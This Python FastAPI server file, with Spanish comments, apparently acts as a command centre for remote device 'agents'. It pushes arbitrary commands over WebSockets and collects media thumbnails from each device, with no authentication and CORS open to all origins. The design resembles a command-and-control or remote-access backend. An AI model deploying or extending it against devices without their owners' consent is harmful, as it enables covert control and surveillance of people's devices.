import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict
from datetime import datetime
import time

# --- INICIALIZACIÓN DE LA APLICACIÓN ---
app = FastAPI(title="Centro de Operaciones de Agentes v4.1")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, dict] = {}
server_events: List[Dict] = []
device_thumbnails_cache: dict[str, list] = {}

# --- FUNCIÓN DE AYUDA PARA LOGS ---
def log_event(event_type: str, message: str, device_id: str = None):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = {"timestamp": timestamp, "type": event_type, "message": message, "device_id": device_id}
    print(f"[{event_type.upper()}] {message}")
    server_events.insert(0, log_entry)
    if len(server_events) > 50: # Guardamos hasta 50 eventos
        server_events.pop()

# --- MODELOS DE DATOS (AHORA COMPLETOS) ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str

class Thumbnail(BaseModel):
    filename: str
    thumbnail_b64: str

class ErrorLog(BaseModel):
    error: str

# --- ENDPOINTS (RUTAS DE LA API) ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    log_event("CONNECT", f"Agente conectado: '{device_name}'", device_id)
    connected_agents[device_id] = {"ws": websocket, "name": device_name, "connect_time": time.time()}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        log_event("DISCONNECT", f"Agente desconectado: '{name_to_print}'", device_id)
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_thumbnails_cache: del device_thumbnails_cache[device_id]


@app.get("/api/health_check")
async def health_check():
    return {
        "server_status": "Activo",
        "server_time_utc": datetime.utcnow().isoformat(),
        "connected_agents": [{"id": dev_id, "name": data["name"]} for dev_id, data in connected_agents.items()],
        "recent_events": server_events
    }

@app.post("/api/log_error/{device_id}")
async def log_error_from_agent(device_id: str, error_log: ErrorLog):
    log_event("AGENT_ERROR", error_log.error, device_id)
    return {"status": "log recibido"}

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    target_id = command.target_id
    if target_id not in connected_agents:
        log_event("ERROR", f"Intento de enviar comando a un agente no conectado: {target_id}")
        return {"status": "error", "message": "Agente no conectado."}
    try:
        agent_socket = connected_agents[target_id]["ws"]
        await agent_socket.send_text(command.json())
        log_event("COMMAND", f"Comando '{command.action}' enviado a '{connected_agents[target_id]['name']}'", target_id)
        return {"status": "success", "message": "Comando enviado."}
    except Exception as e:
        log_event("ERROR", f"Fallo al enviar comando a {target_id}: {e}", target_id)
        return {"status": "error", "message": "Fallo de comunicación."}

@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(device_id: str, thumbnails: List[Thumbnail]):
    if device_id not in connected_agents:
        return {"status": "error", "message": "Agente no registrado."}
    log_event("INFO", f"Recibidas {len(thumbnails)} miniaturas del agente '{connected_agents[device_id]['name']}'", device_id)
    device_thumbnails_cache[device_id] = [thumb.dict() for thumb in thumbnails]
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    log_event("INFO", f"Panel pide la lista de medios para el agente con ID: {device_id[:8]}...", device_id)
    return device_thumbnails_cache.get(device_id, [])

log_event("STARTUP", "El servidor se ha iniciado correctamente.")
